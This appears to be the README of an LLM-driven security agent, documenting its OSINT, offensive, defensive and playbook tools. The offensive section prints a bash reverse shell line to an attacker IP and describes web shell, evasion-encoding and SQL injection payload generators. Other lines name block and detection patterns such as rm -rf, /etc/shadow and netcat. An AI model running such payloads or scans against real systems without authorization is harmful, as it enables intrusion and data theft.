# Zuck - AI Cybersecurity Agent

A comprehensive, modular AI-powered cybersecurity assistant with **49 built-in tools** for offensive security, defensive analysis, OSINT, forensics, and more. Powered by **LangChain** with support for multiple LLM providers.

## Features

- **57 Security Tools**: OSINT, offensive, defensive, forensics, playbooks, shell execution
- **Agent Orchestration**: Stateful planning engine with progress tracking
- **Multi-Provider LLM**: Google Gemini, OpenAI, Anthropic, Groq (Llama 4)
- **ReAct Loop**: Automatic tool chaining with retry and error recovery
- **Shell Execution**: Secure terminal access with allowlists
- **Automated Playbooks**: Recon, web pentest, incident response
- **Knowledge Base**: MITRE ATT&CK, OWASP Top 10 references
- **Modular Architecture**: Easy to extend with new tools

## Reliability Statement

| Problem | Solution | Impact |
|---------|----------|--------|
| **Unstructured execution** - Agent called tools randomly | Implemented **stateful planning engine** with `create_plan`, checkpoints, and progress tracking | Predictable, auditable multi-step operations |
| **Runaway loops** - Agent could spin forever | Bounded **ReAct loop** to max 10 iterations | Guaranteed termination |
| **No shell access** - Limited to Python tools only | Added **secure shell execution** with command allowlists and pattern blocking | Full terminal power with safety guardrails |
| **Type validation errors** - Tool calls failed | **Robust parameter handling** with type coercion and defaults | Higher tool execution success rate |

## Quick Start

```bash
# Install
git clone https://github.com/adityasasidhar/Zuck-your-very-own-AI-hacker-buddy.git
cd Zuck-your-very-own-AI-hacker-buddy
pip install -r requirements.txt
echo "YOUR_API_KEY" > apikey.txt

# Run
python main.py
# or
python -m zuck --provider google --model gemini-2.5-flash
```

---

# 📚 Tool Documentation

## Table of Contents
- [Original Tools](#original-tools)
- [OSINT & Reconnaissance](#osint--reconnaissance)
- [Offensive Security](#offensive-security)
- [Defensive Security](#defensive-security)
- [Playbooks](#playbooks)
- [Knowledge Base](#knowledge-base)

---

## Original Tools

### `calculator`
**Purpose**: Network and mathematical calculations.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `expression` | str | Mathematical or network expression |

**Capabilities**:
- Basic math: `2+2`, `10*5`, `100/4`
- Subnet calculations: `192.168.1.0/24 size`
- Hex/decimal: `0xFF to decimal`, `255 to hex`
- Binary: `0b11111111 to decimal`

**Examples**:
```python
calculator("192.168.1.0/24 size")
# Returns: network, netmask, broadcast, usable hosts

calculator("0xFF to decimal")
# Returns: 255
```

---

### `virustotal_lookup`
**Purpose**: Check file hashes, URLs, domains, or IPs against VirusTotal.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `resource` | str | required | Hash, URL, domain, or IP |
| `resource_type` | str | "auto" | Type: hash, url, domain, ip, auto |

**Requires**: `virustotalapikey.txt` with your VT API key.

**Examples**:
```python
virustotal_lookup("44d88612fea8a8f36de82e1278abb02f", "hash")
virustotal_lookup("google.com", "domain")
virustotal_lookup("8.8.8.8", "ip")
```

**Returns**: Malicious/suspicious counts, reputation score, last analysis date.

---

### `datetime_tool`
**Purpose**: Parse timestamps and calculate time differences.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `operation` | str | now, parse, diff |
| `timestamp` | str | Timestamp to parse (optional) |
| `timezone_str` | str | Timezone (default: UTC) |

**Examples**:
```python
datetime_tool("now")  # Current UTC time
datetime_tool("parse", "2024-01-15 10:30:00")
datetime_tool("diff", "2024-01-15 10:00:00")  # Time since
```

---

### `memory_store`
**Purpose**: Store and retrieve findings during the session.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `action` | str | store, retrieve, list, clear |
| `key` | str | Storage key |
| `value` | str | Value to store |

**Examples**:
```python
memory_store("store", "target_ip", "192.168.1.100")
memory_store("retrieve", "target_ip")
memory_store("list")  # Show all keys
```

---

### `read_file`
**Purpose**: Safely read files with security restrictions.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `filepath` | str | required | Path to file |
| `max_lines` | int | 100 | Maximum lines to read |

**Security**: Blocks `/etc/shadow`, `/etc/gshadow`, `/root/.ssh`. Max 10MB.

**Examples**:
```python
read_file("/etc/hosts")
read_file("/var/log/syslog", max_lines=50)
```

---

### `http_request`
**Purpose**: Make HTTP requests and analyze responses.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `url` | str | required | Target URL |
| `method` | str | "GET" | HTTP method |
| `headers` | str | None | JSON string of headers |

**Examples**:
```python
http_request("https://example.com")
http_request("https://api.example.com", "POST", '{"Content-Type": "application/json"}')
```

**Returns**: Status code, headers, content preview.

---

### `dns_lookup`
**Purpose**: Query DNS records.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `domain` | str | required | Domain to query |
| `record_type` | str | "A" | A, AAAA, MX, TXT, NS, CNAME, SOA |

**Examples**:
```python
dns_lookup("google.com", "A")
dns_lookup("example.com", "MX")
dns_lookup("example.com", "TXT")
```

---

### `whois_lookup`
**Purpose**: Get domain registration information.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `domain` | str | Domain to look up |

**Returns**: Registrar, creation/expiration dates, name servers, emails.

---

### `python_repl`
**Purpose**: Execute Python code for data analysis.

**Usage**: Pass valid Python code. Returns execution output.

**Warning**: Executes arbitrary Python. Use with caution.

---

### `wikipedia_search`
**Purpose**: Look up security concepts on Wikipedia.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `query` | str | required | Search query |
| `sentences` | int | 3 | Sentences to return |

**Examples**:
```python
wikipedia_search("SQL injection")
wikipedia_search("TLS protocol")
```

---

## OSINT & Reconnaissance

### `shodan_host_lookup`
**Purpose**: Get detailed information about an IP from Shodan.

**Requires**: `shodanapikey.txt`

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `ip` | str | IP address to look up |

**Returns**:
- Hostnames, country, city, organization
- Open ports and services
- Known vulnerabilities (CVEs)
- Service banners

**Example**:
```python
shodan_host_lookup("8.8.8.8")
```

---

### `shodan_search`
**Purpose**: Search Shodan for hosts matching criteria.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `query` | str | required | Shodan search query |
| `limit` | int | 10 | Max results |

**Query Examples**:
- `nginx country:US` - Nginx servers in US
- `port:3389 os:windows` - Windows RDP
- `vuln:CVE-2021-44228` - Log4Shell vulnerable

---

### `find_subdomains`
**Purpose**: Discover subdomains via certificate transparency (crt.sh).

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `domain` | str | Target domain |

**How it works**: Queries crt.sh for SSL certificates issued for the domain, extracting all subdomains from certificate SAN fields.

**Example**:
```python
find_subdomains("google.com")
# Returns: mail.google.com, drive.google.com, etc.
```

---

### `dns_subdomain_bruteforce`
**Purpose**: Discover subdomains through DNS resolution.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `domain` | str | required | Target domain |
| `wordlist` | str | "common" | common (50) or extended (200) |

**How it works**: Attempts DNS resolution for common subdomain names like www, mail, api, dev, staging, etc.

---

### `ip_geolocation`
**Purpose**: Get geolocation and network info for an IP.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `ip` | str | IP address |

**Returns**:
- Country, region, city, coordinates
- ISP, organization, ASN
- Flags: is_mobile, is_proxy, is_hosting

**API**: Uses ip-api.com (free, no key required).

---

### `bulk_ip_lookup`
**Purpose**: Look up multiple IPs at once.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `ips` | str | Comma-separated IPs (max 10) |

**Example**:
```python
bulk_ip_lookup("8.8.8.8,1.1.1.1,4.4.4.4")
```

---

### `username_search`
**Purpose**: Check if a username exists across 30+ platforms.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `username` | str | Username to search |

**Platforms checked**: GitHub, Twitter, Instagram, LinkedIn, Reddit, Medium, dev.to, GitLab, TikTok, YouTube, Twitch, etc.

**How it works**: Makes parallel HTTP requests to each platform's profile URL and checks response status.

---

### `email_osint`
**Purpose**: Investigate an email address.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `email` | str | Email to investigate |

**Returns**:
- Username and domain extraction
- MX records for domain
- Free provider detection (gmail, yahoo, etc.)
- Disposable email detection

---

## Offensive Security

### `cve_lookup`
**Purpose**: Get detailed CVE information from NVD.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `cve_id` | str | CVE ID (e.g., CVE-2021-44228) |

**Returns**:
- Description, published date
- CVSS score and severity
- Vector string
- Weaknesses (CWE)
- References

**Example**:
```python
cve_lookup("CVE-2021-44228")  # Log4Shell
cve_lookup("CVE-2017-0144")   # EternalBlue
```

---

### `search_exploits`
**Purpose**: Search ExploitDB for exploits.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `query` | str | required | Search query |
| `limit` | int | 10 | Max results |

**Example**:
```python
search_exploits("apache 2.4")
search_exploits("wordpress 5.0")
```

---

### `exploit_info`
**Purpose**: Get details about a specific ExploitDB exploit.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `exploit_id` | str | ExploitDB ID |

**Returns**: Direct URLs to view, download, and raw exploit code.

---

### `generate_reverse_shell`
**Purpose**: Generate reverse shell payloads.

**⚠️ WARNING**: For authorized testing only!

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `shell_type` | str | bash, python, php, perl, ruby, nc, powershell, etc. |
| `ip` | str | Attacker IP |
| `port` | int | Listening port |

**Supported shells**: bash, bash_udp, sh, python, python3, php, php_exec, perl, ruby, nc, nc_mkfifo, ncat, powershell, socat, awk

**Example**:
```python
generate_reverse_shell("bash", "10.10.10.1", 4444)
# Returns: bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
```

---

### `encode_payload`
**Purpose**: Encode payloads for evasion.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `payload` | str | required | Payload to encode |
| `encoding` | str | "base64" | base64, url, hex, unicode, html |

**Example**:
```python
encode_payload("whoami", "base64")
# Returns: d2hvYW1p
```

---

### `generate_webshell`
**Purpose**: Generate web shell payloads.

**⚠️ WARNING**: For authorized testing only!

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `shell_type` | str | required | php, asp, aspx, jsp |
| `password` | str | "" | Optional password protection |

---

### `identify_hash`
**Purpose**: Identify hash type and get cracking commands.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `hash_value` | str | Hash to identify |

**Detects**: MD5, SHA1, SHA256, SHA512, NTLM, bcrypt, MySQL, Unix crypt variants, LM, Cisco types

**Returns**:
- Possible hash types
- Hashcat mode number
- John the Ripper format
- Example cracking commands

---

### `hash_string`
**Purpose**: Generate hash of a string.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `text` | str | required | Text to hash |
| `algorithm` | str | "md5" | md5, sha1, sha256, sha512, blake2b |

---

### `generate_wordlist_command`
**Purpose**: Generate wordlist creation commands.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `target_info` | str | Target info (company, location, etc.) |

**Returns**: Commands for cewl, crunch, cupp, john rules, plus common wordlist paths.

---

### `port_scan`
**Purpose**: Python-native TCP port scanner.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `target` | str | required | IP or hostname |
| `ports` | str | "common" | common, top100, 1-1000, or 80,443,8080 |
| `timeout` | float | 1.0 | Connection timeout |

**How it works**: Uses Python sockets with parallel threading (50 workers). Identifies services from common port mappings.

**Example**:
```python
port_scan("192.168.1.1")           # Top 25 ports
port_scan("10.0.0.1", "top100")    # Top 100 ports
port_scan("example.com", "22,80,443,3389")
```

---

### `banner_grab`
**Purpose**: Grab service banner from a port.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `target` | str | required | IP or hostname |
| `port` | int | required | Port number |
| `timeout` | float | 3.0 | Timeout |

---

### `ping_sweep`
**Purpose**: Discover live hosts in a network.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `network` | str | CIDR notation (e.g., 192.168.1.0/24) |

**How it works**: Attempts TCP connections to common ports (80, 443, 22, 445) on each host. Uses parallel scanning.

**Limit**: Maximum /24 (256 hosts).

---

### `sqli_payloads`
**Purpose**: Get SQL injection payloads.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `payload_type` | str | "basic" | basic, union, blind, error, all |

---

### `generate_sqlmap_command`
**Purpose**: Generate sqlmap commands.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `url` | str | required | Target URL |
| `mode` | str | "basic" | basic, aggressive, dump |

---

## Defensive Security

### `analyze_auth_log`
**Purpose**: Analyze authentication logs for security events.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `filepath` | str | /var/log/auth.log | Log file path |
| `lines` | int | 500 | Lines to analyze |

**Detects**:
- Failed login attempts
- Successful logins
- Sudo commands
- Brute force attempts (>5 failures from same IP)

---

### `analyze_web_log`
**Purpose**: Analyze web server logs for attacks.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `filepath` | str | Path to access log |
| `lines` | int | Lines to analyze (default 500) |

**Detects**:
- SQL injection attempts
- XSS attempts
- Path traversal
- Command injection

---

### `search_logs`
**Purpose**: Search logs for patterns.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `pattern` | str | required | Regex pattern |
| `log_path` | str | /var/log | Directory to search |
| `file_pattern` | str | *.log | File glob |

---

### `analyze_processes`
**Purpose**: Detect suspicious running processes.

**Arguments**: None (analyzes current system)

**Detects**:
- High CPU/memory usage
- Suspicious patterns: netcat, base64 decode pipes, /tmp execution, crypto miners
- Processes running from unusual locations

---

### `analyze_connections`
**Purpose**: Monitor network connections.

**Arguments**: None

**Returns**:
- Listening ports
- Established connections
- Suspicious port usage (4444, 5555, 1337, etc.)

---

### `check_open_ports`
**Purpose**: List all open listening ports.

**Arguments**: None

**Returns**: Port number, bind address, process info.

---

### `extract_iocs`
**Purpose**: Extract IOCs from text.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `text` | str | Text to analyze |

**Extracts**:
- IPv4/IPv6 addresses
- Domains and URLs
- Email addresses
- MD5, SHA1, SHA256 hashes
- Bitcoin addresses
- CVE identifiers

---

### `extract_iocs_from_file`
**Purpose**: Extract IOCs from a file.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `filepath` | str | Path to file |

---

### `analyze_file_hashes`
**Purpose**: Calculate file hashes for malware analysis.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `filepath` | str | Path to file |

**Returns**: MD5, SHA1, SHA256 hashes, plus VirusTotal URL for lookup.

---

### `analyze_ssl`
**Purpose**: Analyze SSL/TLS configuration.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `hostname` | str | required | Target hostname |
| `port` | int | 443 | Port number |

**Returns**:
- TLS version and cipher suite
- Certificate details (subject, issuer, validity)
- Days until expiration
- Security warnings

---

### `analyze_security_headers`
**Purpose**: Audit HTTP security headers.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `url` | str | URL to analyze |

**Checks**:
- Strict-Transport-Security (HSTS)
- Content-Security-Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- X-XSS-Protection

**Returns**: Score (0-5), each header's value, and recommendations.

---

## Playbooks

### `run_recon_playbook`
**Purpose**: Automated reconnaissance workflow.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `target` | str | required | Target domain or IP |
| `depth` | str | "basic" | basic, standard, deep |

**Phases**:
1. DNS & WHOIS lookup
2. Subdomain enumeration
3. Port scanning
4. SSL/TLS analysis (standard+)
5. Security headers (standard+)

---

### `run_web_pentest`
**Purpose**: Web application testing workflow.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `url` | str | required | Target URL |
| `scope` | str | "passive" | passive, active |

**Phases**:
1. HTTP analysis
2. Security headers
3. Technology detection
4. Recommendations (nikto, sqlmap, etc.)

---

### `run_ir_playbook`
**Purpose**: Incident response workflow.

**Arguments**:
| Arg | Type | Default | Description |
|-----|------|---------|-------------|
| `incident_type` | str | "general" | general, malware, intrusion, data_breach |

**Phases**:
1. Process analysis
2. Network connection analysis
3. Auth log analysis
4. IOC collection
5. Type-specific recommendations

---

## Knowledge Base

### `get_attack_technique`
**Purpose**: MITRE ATT&CK technique lookup.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `technique_id` | str | MITRE ID (e.g., T1059) |

**Returns**: Name, tactic, description, subtechniques, mitigations.

---

### `search_techniques`
**Purpose**: Search ATT&CK techniques by keyword.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `keyword` | str | Search term |

---

### `get_owasp_info`
**Purpose**: OWASP Top 10 reference.

**Arguments**:
| Arg | Type | Description |
|-----|------|-------------|
| `category` | str | A01-A10 or keyword (e.g., "injection") |

**Returns**: Category name, description, examples, prevention measures.

---

## Agent Orchestration & Reliability

Zuck implements a robust agentic architecture designed for complex, multi-step cybersecurity operations.

### ReAct Loop Execution
The agent uses a **Reason-Act-Observe** loop with automatic tool chaining:
- Maximum 10 iterations per request
- Automatic retry with exponential backoff on rate limits
- Graceful error handling and recovery

### Stateful Planning Engine

#### `create_plan`
Create a structured execution plan stored in session memory.

```python
create_plan(["Enumerate subdomains", "Scan ports", "Check CVEs", "Generate report"])
```

#### `update_plan_step`
Track progress as steps complete.

```python
update_plan_step(1, "done", "Found 47 subdomains")
update_plan_step(2, "in_progress")
```

#### `get_current_plan`
Recall the current mission state at any time.

### Shell Execution

Full terminal access with security controls:

| Tool | Purpose |
|------|---------|
| `shell_run` | Execute command synchronously (60s timeout) |
| `shell_run_background` | Async execution for long-running jobs |
| `shell_status` | Check background job status |
| `shell_terminate` | Kill running jobs |
| `shell_list` | List all tracked commands |

**Security**: Commands are validated against an allowlist (nmap, curl, grep, etc.) and blocked patterns (rm -rf, etc.).

### Multi-Provider LLM Support

| Provider | Models | Notes |
|----------|--------|-------|
| **Groq** | Llama 4 Scout, GPT-OSS-120B | Fast inference (~750 tok/s) |
| **Google** | Gemini 2.5 Flash | Default provider |
| **OpenAI** | GPT-4o, GPT-4 Turbo | Full tool calling |
| **Anthropic** | Claude 3.5 Sonnet | Strong reasoning |

```bash
python main.py --provider groq --model meta-llama/llama-4-scout-17b-16e-instruct
```

### Configuration via Environment

All secrets managed via `.env` file:

```env
GROQ_API_KEY=gsk_xxx
GOOGLE_API_KEY=AIza...
SHODAN_API_KEY=xxx
VIRUSTOTAL_API_KEY=xxx
```

---

## API Keys


| Service | File | Required For |
|---------|------|--------------|
| Google Gemini | `apikey.txt` | LLM (default) |
| Shodan | `shodanapikey.txt` | shodan_* tools |
| VirusTotal | `virustotalapikey.txt` | virustotal_lookup |

## License

MIT License - see [LICENSE](LICENSE)
